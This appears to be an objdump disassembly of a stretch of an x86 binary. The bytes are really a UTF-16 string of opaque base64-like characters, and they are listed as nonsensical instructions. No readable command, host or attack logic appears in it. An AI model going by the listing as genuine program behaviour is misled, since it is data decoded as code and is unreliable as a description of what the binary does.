  40a9b0:	42                   	inc    %edx
  40a9b1:	00 56 00             	add    %dl,0x0(%esi)
  40a9b4:	67 00 64 00          	add    %ah,0x0(%si)
  40a9b8:	39 00                	cmp    %eax,(%eax)
  40a9ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9bb:	00 49 00             	add    %cl,0x0(%ecx)
  40a9be:	31 00                	xor    %eax,(%eax)
  40a9c0:	72 00                	jb     0x40a9c2
  40a9c2:	49                   	dec    %ecx
  40a9c3:	00 5a 00             	add    %bl,0x0(%edx)
  40a9c6:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a9ca:	5a                   	pop    %edx
  40a9cb:	00 36                	add    %dh,(%esi)
  40a9cd:	00 36                	add    %dh,(%esi)
  40a9cf:	00 76 00             	add    %dh,0x0(%esi)
  40a9d2:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a9d5:	00 36                	add    %dh,(%esi)
  40a9d7:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9da:	2b 00                	sub    (%eax),%eax
  40a9dc:	7a 00                	jp     0x40a9de
  40a9de:	47                   	inc    %edi
  40a9df:	00 35 00 6e 00 48    	add    %dh,0x48006e00
  40a9e5:	00 57 00             	add    %dl,0x0(%edi)
  40a9e8:	4b                   	dec    %ebx
  40a9e9:	00 76 00             	add    %dh,0x0(%esi)
  40a9ec:	7a 00                	jp     0x40a9ee
  40a9ee:	2b 00                	sub    (%eax),%eax
  40a9f0:	69 00 41 00 58 00    	imul   $0x580041,(%eax),%eax
  40a9f6:	42                   	inc    %edx
  40a9f7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9fa:	75 00                	jne    0x40a9fc
  40a9fc:	36 00 64 00 72       	add    %ah,%ss:0x72(%eax,%eax,1)
  40aa01:	00 47 00             	add    %al,0x0(%edi)
  40aa04:	54                   	push   %esp
  40aa05:	00 35 00 57 00 2b    	add    %dh,0x2b005700
  40aa0b:	00 4f 00             	add    %cl,0x0(%edi)
  40aa0e:	57                   	push   %edi
  40aa0f:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40aa13:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa16:	61                   	popa
  40aa17:	00 39                	add    %bh,(%ecx)
  40aa19:	00 50 00             	add    %dl,0x0(%eax)
  40aa1c:	6b 00 67             	imul   $0x67,(%eax),%eax
  40aa1f:	00 47 00             	add    %al,0x0(%edi)
  40aa22:	50                   	push   %eax
  40aa23:	00 71 00             	add    %dh,0x0(%ecx)
  40aa26:	76 00                	jbe    0x40aa28
  40aa28:	4a                   	dec    %edx
  40aa29:	00 49 00             	add    %cl,0x0(%ecx)
  40aa2c:	31 00                	xor    %eax,(%eax)
  40aa2e:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa2f:	00 36                	add    %dh,(%esi)
  40aa31:	00 62 00             	add    %ah,0x0(%edx)
  40aa34:	41                   	inc    %ecx
  40aa35:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa38:	31 00                	xor    %eax,(%eax)
  40aa3a:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40aa3e:	61                   	popa
  40aa3f:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40aa43:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40aa47:	00 51 00             	add    %dl,0x0(%ecx)
  40aa4a:	56                   	push   %esi
  40aa4b:	00 57 00             	add    %dl,0x0(%edi)
  40aa4e:	48                   	dec    %eax
  40aa4f:	00 65 00             	add    %ah,0x0(%ebp)
  40aa52:	46                   	inc    %esi
  40aa53:	00 62 00             	add    %ah,0x0(%edx)
  40aa56:	57                   	push   %edi
  40aa57:	00 2b                	add    %ch,(%ebx)
  40aa59:	00 4a 00             	add    %cl,0x0(%edx)
  40aa5c:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa5d:	00 4f 00             	add    %cl,0x0(%edi)
  40aa60:	53                   	push   %ebx
  40aa61:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40aa65:	00 39                	add    %bh,(%ecx)
  40aa67:	00 31                	add    %dh,(%ecx)
  40aa69:	00 32                	add    %dh,(%edx)
  40aa6b:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40aa6f:	00 30                	add    %dh,(%eax)
  40aa71:	00 39                	add    %bh,(%ecx)
  40aa73:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa76:	46                   	inc    %esi
  40aa77:	00 61 00             	add    %ah,0x0(%ecx)
  40aa7a:	61                   	popa
  40aa7b:	00 4a 00             	add    %cl,0x0(%edx)
  40aa7e:	43                   	inc    %ebx
  40aa7f:	00 52 00             	add    %dl,0x0(%edx)
  40aa82:	38 00                	cmp    %al,(%eax)
  40aa84:	5a                   	pop    %edx
  40aa85:	00 69 00             	add    %ch,0x0(%ecx)
  40aa88:	57                   	push   %edi
  40aa89:	00 72 00             	add    %dh,0x0(%edx)
  40aa8c:	51                   	push   %ecx
  40aa8d:	00 2f                	add    %ch,(%edi)
  40aa8f:	00 65 00             	add    %ah,0x0(%ebp)
  40aa92:	56                   	push   %esi
  40aa93:	00 70 00             	add    %dh,0x0(%eax)
  40aa96:	33 00                	xor    (%eax),%eax
  40aa98:	68 00 51 00 41       	push   $0x41005100
  40aa9d:	00 76 00             	add    %dh,0x0(%esi)
  40aaa0:	73 00                	jae    0x40aaa2
  40aaa2:	57                   	push   %edi
  40aaa3:	00 41 00             	add    %al,0x0(%ecx)
  40aaa6:	42                   	inc    %edx
  40aaa7:	00 4f 00             	add    %cl,0x0(%edi)
  40aaaa:	56                   	push   %esi
  40aaab:	00 2b                	add    %ch,(%ebx)
  40aaad:	00 31                	add    %dh,(%ecx)
  40aaaf:	00 30                	add    %dh,(%eax)
  40aab1:	00 42 00             	add    %al,0x0(%edx)
  40aab4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aab5:	00 69 00             	add    %ch,0x0(%ecx)
  40aab8:	47                   	inc    %edi
  40aab9:	00 45 00             	add    %al,0x0(%ebp)
  40aabc:	6f                   	outsl  %ds:(%esi),(%dx)
  40aabd:	00 67 00             	add    %ah,0x0(%edi)
  40aac0:	71 00                	jno    0x40aac2
  40aac2:	65 00 33             	add    %dh,%gs:(%ebx)
  40aac5:	00 79 00             	add    %bh,0x0(%ecx)
  40aac8:	43                   	inc    %ebx
  40aac9:	00 2f                	add    %ch,(%edi)
  40aacb:	00 41 00             	add    %al,0x0(%ecx)
  40aace:	61                   	popa
  40aacf:	00 75 00             	add    %dh,0x0(%ebp)
  40aad2:	44                   	inc    %esp
  40aad3:	00 53 00             	add    %dl,0x0(%ebx)
  40aad6:	32 00                	xor    (%eax),%al
  40aad8:	38 00                	cmp    %al,(%eax)
  40aada:	44                   	inc    %esp
  40aadb:	00 45 00             	add    %al,0x0(%ebp)
  40aade:	6e                   	outsb  %ds:(%esi),(%dx)
  40aadf:	00 49 00             	add    %cl,0x0(%ecx)
  40aae2:	4e                   	dec    %esi
  40aae3:	00 73 00             	add    %dh,0x0(%ebx)
  40aae6:	44                   	inc    %esp
  40aae7:	00 42 00             	add    %al,0x0(%edx)
  40aaea:	57                   	push   %edi
  40aaeb:	00 35 00 4d 00 4b    	add    %dh,0x4b004d00
  40aaf1:	00 77 00             	add    %dh,0x0(%edi)
  40aaf4:	6d                   	insl   (%dx),%es:(%edi)
  40aaf5:	00 4d 00             	add    %cl,0x0(%ebp)
  40aaf8:	5a                   	pop    %edx
  40aaf9:	00 77 00             	add    %dh,0x0(%edi)
  40aafc:	6c                   	insb   (%dx),%es:(%edi)
  40aafd:	00 5a 00             	add    %bl,0x0(%edx)
  40ab00:	4a                   	dec    %edx
  40ab01:	00 68 00             	add    %ch,0x0(%eax)
  40ab04:	6a 00                	push   $0x0
  40ab06:	57                   	push   %edi
  40ab07:	00 2f                	add    %ch,(%edi)
  40ab09:	00 41 00             	add    %al,0x0(%ecx)
  40ab0c:	50                   	push   %eax
  40ab0d:	00 57 00             	add    %dl,0x0(%edi)
  40ab10:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab11:	00 6e 00             	add    %ch,0x0(%esi)
  40ab14:	5a                   	pop    %edx
  40ab15:	00 50 00             	add    %dl,0x0(%eax)
  40ab18:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40ab1c:	42                   	inc    %edx
  40ab1d:	00 57 00             	add    %dl,0x0(%edi)
  40ab20:	41                   	inc    %ecx
  40ab21:	00 49 00             	add    %cl,0x0(%ecx)
  40ab24:	4f                   	dec    %edi
  40ab25:	00 63 00             	add    %ah,0x0(%ebx)
  40ab28:	33 00                	xor    (%eax),%eax
  40ab2a:	4f                   	dec    %edi
  40ab2b:	00 77 00             	add    %dh,0x0(%edi)
  40ab2e:	2b 00                	sub    (%eax),%eax
  40ab30:	52                   	push   %edx
  40ab31:	00 58 00             	add    %bl,0x0(%eax)
  40ab34:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab35:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab38:	34 00                	xor    $0x0,%al
  40ab3a:	33 00                	xor    (%eax),%eax
  40ab3c:	4e                   	dec    %esi
  40ab3d:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab40:	79 00                	jns    0x40ab42
  40ab42:	6b 00 75             	imul   $0x75,(%eax),%eax
  40ab45:	00 76 00             	add    %dh,0x0(%esi)
  40ab48:	6c                   	insb   (%dx),%es:(%edi)
  40ab49:	00 37                	add    %dh,(%edi)
  40ab4b:	00 5a 00             	add    %bl,0x0(%edx)
  40ab4e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab4f:	00 5a 00             	add    %bl,0x0(%edx)
  40ab52:	67 00 37             	add    %dh,(%bx)
  40ab55:	00 50 00             	add    %dl,0x0(%eax)
  40ab58:	52                   	push   %edx
  40ab59:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab5c:	4d                   	dec    %ebp
  40ab5d:	00 46 00             	add    %al,0x0(%esi)
  40ab60:	34 00                	xor    $0x0,%al
  40ab62:	75 00                	jne    0x40ab64
  40ab64:	52                   	push   %edx
  40ab65:	00 79 00             	add    %bh,0x0(%ecx)
  40ab68:	61                   	popa
  40ab69:	00 31                	add    %dh,(%ecx)
  40ab6b:	00 69 00             	add    %ch,0x0(%ecx)
  40ab6e:	75 00                	jne    0x40ab70
  40ab70:	69 00 6f 00 71 00    	imul   $0x71006f,(%eax),%eax
  40ab76:	70 00                	jo     0x40ab78
  40ab78:	46                   	inc    %esi
  40ab79:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40ab7d:	00 58 00             	add    %bl,0x0(%eax)
  40ab80:	6a 00                	push   $0x0
  40ab82:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40ab86:	78 00                	js     0x40ab88
  40ab88:	69 00 79 00 62 00    	imul   $0x620079,(%eax),%eax
  40ab8e:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40ab92:	6a 00                	push   $0x0
  40ab94:	2b 00                	sub    (%eax),%eax
  40ab96:	75 00                	jne    0x40ab98
  40ab98:	44                   	inc    %esp
  40ab99:	00 31                	add    %dh,(%ecx)
  40ab9b:	00 55 00             	add    %dl,0x0(%ebp)
  40ab9e:	54                   	push   %esp
  40ab9f:	00 59 00             	add    %bl,0x0(%ecx)
  40aba2:	72 00                	jb     0x40aba4
  40aba4:	72 00                	jb     0x40aba6
  40aba6:	53                   	push   %ebx
  40aba7:	00 4a 00             	add    %cl,0x0(%edx)
  40abaa:	6b 00 45             	imul   $0x45,(%eax),%eax
  40abad:	00 56 00             	add    %dl,0x0(%esi)
  40abb0:	42                   	inc    %edx
  40abb1:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40abb5:	00 2f                	add    %ch,(%edi)
  40abb7:	00 51 00             	add    %dl,0x0(%ecx)
  40abba:	56                   	push   %esi
  40abbb:	00 75 00             	add    %dh,0x0(%ebp)
  40abbe:	32 00                	xor    (%eax),%al
  40abc0:	39 00                	cmp    %eax,(%eax)
  40abc2:	56                   	push   %esi
  40abc3:	00 71 00             	add    %dh,0x0(%ecx)
  40abc6:	55                   	push   %ebp
  40abc7:	00 2f                	add    %ch,(%edi)
  40abc9:	00 71 00             	add    %dh,0x0(%ecx)
  40abcc:	47                   	inc    %edi
  40abcd:	00 57 00             	add    %dl,0x0(%edi)
  40abd0:	55                   	push   %ebp
  40abd1:	00 5a 00             	add    %bl,0x0(%edx)
  40abd4:	31 00                	xor    %eax,(%eax)
  40abd6:	30 00                	xor    %al,(%eax)
  40abd8:	59                   	pop    %ecx
  40abd9:	00 45 00             	add    %al,0x0(%ebp)
  40abdc:	7a 00                	jp     0x40abde
  40abde:	57                   	push   %edi
  40abdf:	00 76 00             	add    %dh,0x0(%esi)
  40abe2:	74 00                	je     0x40abe4
  40abe4:	45                   	inc    %ebp
  40abe5:	00 51 00             	add    %dl,0x0(%ecx)
  40abe8:	30 00                	xor    %al,(%eax)
  40abea:	6e                   	outsb  %ds:(%esi),(%dx)
  40abeb:	00 6b 00             	add    %ch,0x0(%ebx)
  40abee:	6b 00 72             	imul   $0x72,(%eax),%eax
  40abf1:	00 57 00             	add    %dl,0x0(%edi)
  40abf4:	79 00                	jns    0x40abf6
  40abf6:	34 00                	xor    $0x0,%al
  40abf8:	71 00                	jno    0x40abfa
  40abfa:	38 00                	cmp    %al,(%eax)
  40abfc:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40ac00:	35 00 54 00 50       	xor    $0x50005400,%eax
  40ac05:	00 53 00             	add    %dl,0x0(%ebx)
  40ac08:	31 00                	xor    %eax,(%eax)
  40ac0a:	77 00                	ja     0x40ac0c
  40ac0c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac0d:	00 68 00             	add    %ch,0x0(%eax)
  40ac10:	41                   	inc    %ecx
  40ac11:	00 4f 00             	add    %cl,0x0(%edi)
  40ac14:	44                   	inc    %esp
  40ac15:	00 30                	add    %dh,(%eax)
  40ac17:	00 4a 00             	add    %cl,0x0(%edx)
  40ac1a:	6a 00                	push   $0x0
  40ac1c:	42                   	inc    %edx
  40ac1d:	00 39                	add    %bh,(%ecx)
  40ac1f:	00 30                	add    %dh,(%eax)
  40ac21:	00 76 00             	add    %dh,0x0(%esi)
  40ac24:	71 00                	jno    0x40ac26
  40ac26:	35 00 7a 00 4b       	xor    $0x4b007a00,%eax
  40ac2b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ac2f:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40ac33:	00 57 00             	add    %dl,0x0(%edi)
  40ac36:	4a                   	dec    %edx
  40ac37:	00 5a 00             	add    %bl,0x0(%edx)
  40ac3a:	4e                   	dec    %esi
  40ac3b:	00 46 00             	add    %al,0x0(%esi)
  40ac3e:	78 00                	js     0x40ac40
  40ac40:	67 00 6c 00          	add    %ch,0x0(%si)
  40ac44:	6a 00                	push   $0x0
  40ac46:	59                   	pop    %ecx
  40ac47:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40ac4b:	00 78 00             	add    %bh,0x0(%eax)
  40ac4e:	50                   	push   %eax
  40ac4f:	00 62 00             	add    %ah,0x0(%edx)
  40ac52:	2b 00                	sub    (%eax),%eax
  40ac54:	71 00                	jno    0x40ac56
  40ac56:	63 00                	arpl   %eax,(%eax)
  40ac58:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  40ac5c:	59                   	pop    %ecx
  40ac5d:	00 76 00             	add    %dh,0x0(%esi)
  40ac60:	56                   	push   %esi
  40ac61:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac64:	39 00                	cmp    %eax,(%eax)
  40ac66:	54                   	push   %esp
  40ac67:	00 36                	add    %dh,(%esi)
  40ac69:	00 63 00             	add    %ah,0x0(%ebx)
  40ac6c:	41                   	inc    %ecx
  40ac6d:	00 30                	add    %dh,(%eax)
  40ac6f:	00 66 00             	add    %ah,0x0(%esi)
  40ac72:	30 00                	xor    %al,(%eax)
  40ac74:	31 00                	xor    %eax,(%eax)
  40ac76:	49                   	dec    %ecx
  40ac77:	00 32                	add    %dh,(%edx)
  40ac79:	00 68 00             	add    %ch,0x0(%eax)
  40ac7c:	51                   	push   %ecx
  40ac7d:	00 52 00             	add    %dl,0x0(%edx)
  40ac80:	5a                   	pop    %edx
  40ac81:	00 4a 00             	add    %cl,0x0(%edx)
  40ac84:	45                   	inc    %ebp
  40ac85:	00 61 00             	add    %ah,0x0(%ecx)
  40ac88:	37                   	aaa
  40ac89:	00 4e 00             	add    %cl,0x0(%esi)
  40ac8c:	48                   	dec    %eax
  40ac8d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac90:	51                   	push   %ecx
  40ac91:	00 32                	add    %dh,(%edx)
  40ac93:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac96:	62 00                	bound  %eax,(%eax)
  40ac98:	76 00                	jbe    0x40ac9a
  40ac9a:	44                   	inc    %esp
  40ac9b:	00 76 00             	add    %dh,0x0(%esi)
  40ac9e:	53                   	push   %ebx
  40ac9f:	00 2b                	add    %ch,(%ebx)
  40aca1:	00 47 00             	add    %al,0x0(%edi)
  40aca4:	55                   	push   %ebp
  40aca5:	00 51 00             	add    %dl,0x0(%ecx)
  40aca8:	66 00 30             	data16 add %dh,(%eax)
  40acab:	00 65 00             	add    %ah,0x0(%ebp)
  40acae:	42                   	inc    %edx
  40acaf:	00 2f                	add    %ch,(%edi)
  40acb1:	00 59 00             	add    %bl,0x0(%ecx)
  40acb4:	4f                   	dec    %edi
  40acb5:	00 71 00             	add    %dh,0x0(%ecx)
  40acb8:	52                   	push   %edx
  40acb9:	00 69 00             	add    %ch,0x0(%ecx)
  40acbc:	49                   	dec    %ecx
  40acbd:	00 58 00             	add    %bl,0x0(%eax)
  40acc0:	79 00                	jns    0x40acc2
  40acc2:	52                   	push   %edx
  40acc3:	00 69 00             	add    %ch,0x0(%ecx)
  40acc6:	48                   	dec    %eax
  40acc7:	00 5a 00             	add    %bl,0x0(%edx)
  40acca:	62 00                	bound  %eax,(%eax)
  40accc:	63 00                	arpl   %eax,(%eax)
  40acce:	66 00 39             	data16 add %bh,(%ecx)
  40acd1:	00 50 00             	add    %dl,0x0(%eax)
  40acd4:	67 00 4f 00          	add    %cl,0x0(%bx)
  40acd8:	6b 00 64             	imul   $0x64,(%eax),%eax
  40acdb:	00 56 00             	add    %dl,0x0(%esi)
  40acde:	4e                   	dec    %esi
  40acdf:	00 7a 00             	add    %bh,0x0(%edx)
  40ace2:	62 00                	bound  %eax,(%eax)
  40ace4:	77 00                	ja     0x40ace6
  40ace6:	6a 00                	push   $0x0
  40ace8:	39 00                	cmp    %eax,(%eax)
  40acea:	4d                   	dec    %ebp
  40aceb:	00 6f 00             	add    %ch,0x0(%edi)
  40acee:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40acf2:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40acf6:	7a 00                	jp     0x40acf8
  40acf8:	4a                   	dec    %edx
  40acf9:	00 6d 00             	add    %ch,0x0(%ebp)
  40acfc:	74 00                	je     0x40acfe
  40acfe:	52                   	push   %edx
  40acff:	00 75 00             	add    %dh,0x0(%ebp)
  40ad02:	56                   	push   %esi
  40ad03:	00 48 00             	add    %cl,0x0(%eax)
  40ad06:	5a                   	pop    %edx
  40ad07:	00 41 00             	add    %al,0x0(%ecx)
  40ad0a:	33 00                	xor    (%eax),%eax
  40ad0c:	72 00                	jb     0x40ad0e
  40ad0e:	42                   	inc    %edx
  40ad0f:	00 5a 00             	add    %bl,0x0(%edx)
  40ad12:	63 00                	arpl   %eax,(%eax)
  40ad14:	37                   	aaa
  40ad15:	00 69 00             	add    %ch,0x0(%ecx)
  40ad18:	53                   	push   %ebx
  40ad19:	00 6e 00             	add    %ch,0x0(%esi)
  40ad1c:	39 00                	cmp    %eax,(%eax)
  40ad1e:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40ad22:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40ad26:	74 00                	je     0x40ad28
  40ad28:	51                   	push   %ecx
  40ad29:	00 58 00             	add    %bl,0x0(%eax)
  40ad2c:	6c                   	insb   (%dx),%es:(%edi)
  40ad2d:	00 7a 00             	add    %bh,0x0(%edx)
  40ad30:	47                   	inc    %edi
  40ad31:	00 48 00             	add    %cl,0x0(%eax)
  40ad34:	44                   	inc    %esp
  40ad35:	00 63 00             	add    %ah,0x0(%ebx)
  40ad38:	74 00                	je     0x40ad3a
  40ad3a:	34 00                	xor    $0x0,%al
  40ad3c:	58                   	pop    %eax
  40ad3d:	00 59 00             	add    %bl,0x0(%ecx)
  40ad40:	32 00                	xor    (%eax),%al
  40ad42:	43                   	inc    %ebx
  40ad43:	00 77 00             	add    %dh,0x0(%edi)
  40ad46:	38 00                	cmp    %al,(%eax)
  40ad48:	53                   	push   %ebx
  40ad49:	00 68 00             	add    %ch,0x0(%eax)
  40ad4c:	71 00                	jno    0x40ad4e
  40ad4e:	56                   	push   %esi
  40ad4f:	00 2b                	add    %ch,(%ebx)
  40ad51:	00 68 00             	add    %ch,0x0(%eax)
  40ad54:	59                   	pop    %ecx
  40ad55:	00 30                	add    %dh,(%eax)
  40ad57:	00 30                	add    %dh,(%eax)
  40ad59:	00 66 00             	add    %ah,0x0(%esi)
  40ad5c:	57                   	push   %edi
  40ad5d:	00 32                	add    %dh,(%edx)
  40ad5f:	00 56 00             	add    %dl,0x0(%esi)
  40ad62:	62 00                	bound  %eax,(%eax)
  40ad64:	76 00                	jbe    0x40ad66
  40ad66:	77 00                	ja     0x40ad68
  40ad68:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40ad6c:	64 00 33             	add    %dh,%fs:(%ebx)
  40ad6f:	00 48 00             	add    %cl,0x0(%eax)
  40ad72:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40ad76:	4e                   	dec    %esi
  40ad77:	00 7a 00             	add    %bh,0x0(%edx)
  40ad7a:	47                   	inc    %edi
  40ad7b:	00 41 00             	add    %al,0x0(%ecx)
  40ad7e:	6b 00 51             	imul   $0x51,(%eax),%eax
  40ad81:	00 50 00             	add    %dl,0x0(%eax)
  40ad84:	75 00                	jne    0x40ad86
  40ad86:	75 00                	jne    0x40ad88
  40ad88:	58                   	pop    %eax
  40ad89:	00 66 00             	add    %ah,0x0(%esi)
  40ad8c:	32 00                	xor    (%eax),%al
  40ad8e:	2b 00                	sub    (%eax),%eax
  40ad90:	32 00                	xor    (%eax),%al
  40ad92:	44                   	inc    %esp
  40ad93:	00 70 00             	add    %dh,0x0(%eax)
  40ad96:	37                   	aaa
  40ad97:	00 41 00             	add    %al,0x0(%ecx)
  40ad9a:	4b                   	dec    %ebx
  40ad9b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad9e:	61                   	popa
  40ad9f:	00 56 00             	add    %dl,0x0(%esi)
  40ada2:	4e                   	dec    %esi
  40ada3:	00 4a 00             	add    %cl,0x0(%edx)
  40ada6:	52                   	push   %edx
  40ada7:	00 77 00             	add    %dh,0x0(%edi)
  40adaa:	6f                   	outsl  %ds:(%esi),(%dx)
  40adab:	00 66 00             	add    %ah,0x0(%esi)
  40adae:	34 00                	xor    $0x0,%al
  40adb0:	48                   	dec    %eax
  40adb1:	00 4a 00             	add    %cl,0x0(%edx)
  40adb4:	47                   	inc    %edi
  40adb5:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40adb9:	00 48 00             	add    %cl,0x0(%eax)
  40adbc:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40adc0:	7a 00                	jp     0x40adc2
  40adc2:	32 00                	xor    (%eax),%al
  40adc4:	48                   	dec    %eax
  40adc5:	00 45 00             	add    %al,0x0(%ebp)
  40adc8:	59                   	pop    %ecx
  40adc9:	00 6f 00             	add    %ch,0x0(%edi)
  40adcc:	43                   	inc    %ebx
  40adcd:	00 41 00             	add    %al,0x0(%ecx)
  40add0:	33 00                	xor    (%eax),%eax
  40add2:	30 00                	xor    %al,(%eax)
  40add4:	50                   	push   %eax
  40add5:	00 4f 00             	add    %cl,0x0(%edi)
  40add8:	36 00 35 00 72 00 37 	add    %dh,%ss:0x37007200
  40addf:	00 59 00             	add    %bl,0x0(%ecx)
  40ade2:	6d                   	insl   (%dx),%es:(%edi)
  40ade3:	00 4e 00             	add    %cl,0x0(%esi)
  40ade6:	43                   	inc    %ebx
  40ade7:	00 2f                	add    %ch,(%edi)
  40ade9:	00 38                	add    %bh,(%eax)
  40adeb:	00 77 00             	add    %dh,0x0(%edi)
  40adee:	76 00                	jbe    0x40adf0
  40adf0:	79 00                	jns    0x40adf2
  40adf2:	4a                   	dec    %edx
  40adf3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40adf6:	56                   	push   %esi
  40adf7:	00 50 00             	add    %dl,0x0(%eax)
  40adfa:	4d                   	dec    %ebp
  40adfb:	00 4f 00             	add    %cl,0x0(%edi)
  40adfe:	32 00                	xor    (%eax),%al
  40ae00:	57                   	push   %edi
  40ae01:	00 30                	add    %dh,(%eax)
  40ae03:	00 36                	add    %dh,(%esi)
  40ae05:	00 72 00             	add    %dh,0x0(%edx)
  40ae08:	59                   	pop    %ecx
  40ae09:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae0c:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40ae10:	51                   	push   %ecx
  40ae11:	00 69 00             	add    %ch,0x0(%ecx)
  40ae14:	51                   	push   %ecx
  40ae15:	00 69 00             	add    %ch,0x0(%ecx)
  40ae18:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40ae1c:	32 00                	xor    (%eax),%al
  40ae1e:	45                   	inc    %ebp
  40ae1f:	00 72 00             	add    %dh,0x0(%edx)
  40ae22:	33 00                	xor    (%eax),%eax
  40ae24:	45                   	inc    %ebp
  40ae25:	00 41 00             	add    %al,0x0(%ecx)
  40ae28:	32 00                	xor    (%eax),%al
  40ae2a:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40ae2e:	5a                   	pop    %edx
  40ae2f:	00 58 00             	add    %bl,0x0(%eax)
  40ae32:	6a 00                	push   $0x0
  40ae34:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae35:	00 30                	add    %dh,(%eax)
  40ae37:	00 77 00             	add    %dh,0x0(%edi)
  40ae3a:	39 00                	cmp    %eax,(%eax)
  40ae3c:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40ae40:	52                   	push   %edx
  40ae41:	00 58 00             	add    %bl,0x0(%eax)
  40ae44:	2b 00                	sub    (%eax),%eax
  40ae46:	57                   	push   %edi
  40ae47:	00 51 00             	add    %dl,0x0(%ecx)
  40ae4a:	46                   	inc    %esi
  40ae4b:	00 38                	add    %bh,(%eax)
  40ae4d:	00 55 00             	add    %dl,0x0(%ebp)
  40ae50:	34 00                	xor    $0x0,%al
  40ae52:	56                   	push   %esi
  40ae53:	00 51 00             	add    %dl,0x0(%ecx)
  40ae56:	46                   	inc    %esi
  40ae57:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae5a:	30 00                	xor    %al,(%eax)
  40ae5c:	5a                   	pop    %edx
  40ae5d:	00 50 00             	add    %dl,0x0(%eax)
  40ae60:	68 00 78 00 51       	push   $0x51007800
  40ae65:	00 2f                	add    %ch,(%edi)
  40ae67:	00 46 00             	add    %al,0x0(%esi)
  40ae6a:	4a                   	dec    %edx
  40ae6b:	00 30                	add    %dh,(%eax)
  40ae6d:	00 55 00             	add    %dl,0x0(%ebp)
  40ae70:	4c                   	dec    %esp
  40ae71:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  40ae75:	00 32                	add    %dh,(%edx)
  40ae77:	00 32                	add    %dh,(%edx)
  40ae79:	00 79 00             	add    %bh,0x0(%ecx)
  40ae7c:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40ae80:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae81:	00 77 00             	add    %dh,0x0(%edi)
  40ae84:	4a                   	dec    %edx
  40ae85:	00 39                	add    %bh,(%ecx)
  40ae87:	00 50 00             	add    %dl,0x0(%eax)
  40ae8a:	2f                   	das
  40ae8b:	00 68 00             	add    %ch,0x0(%eax)
  40ae8e:	39 00                	cmp    %eax,(%eax)
  40ae90:	57                   	push   %edi
  40ae91:	00 48 00             	add    %cl,0x0(%eax)
  40ae94:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40ae98:	57                   	push   %edi
  40ae99:	00 79 00             	add    %bh,0x0(%ecx)
  40ae9c:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40aea0:	69 00 37 00 6c 00    	imul   $0x6c0037,(%eax),%eax
  40aea6:	42                   	inc    %edx
  40aea7:	00 59 00             	add    %bl,0x0(%ecx)
  40aeaa:	44                   	inc    %esp
  40aeab:	00 32                	add    %dh,(%edx)
  40aead:	00 38                	add    %bh,(%eax)
  40aeaf:	00 35 00 75 00 6b    	add    %dh,0x6b007500
  40aeb5:	00 46 00             	add    %al,0x0(%esi)
  40aeb8:	51                   	push   %ecx
  40aeb9:	00 66 00             	add    %ah,0x0(%esi)
  40aebc:	49                   	dec    %ecx
  40aebd:	00 48 00             	add    %cl,0x0(%eax)
  40aec0:	56                   	push   %esi
  40aec1:	00 43 00             	add    %al,0x0(%ebx)
  40aec4:	4a                   	dec    %edx
  40aec5:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40aec9:	00 59 00             	add    %bl,0x0(%ecx)
  40aecc:	75 00                	jne    0x40aece
  40aece:	2b 00                	sub    (%eax),%eax
  40aed0:	4a                   	dec    %edx
  40aed1:	00 66 00             	add    %ah,0x0(%esi)
  40aed4:	4a                   	dec    %edx
  40aed5:	00 75 00             	add    %dh,0x0(%ebp)
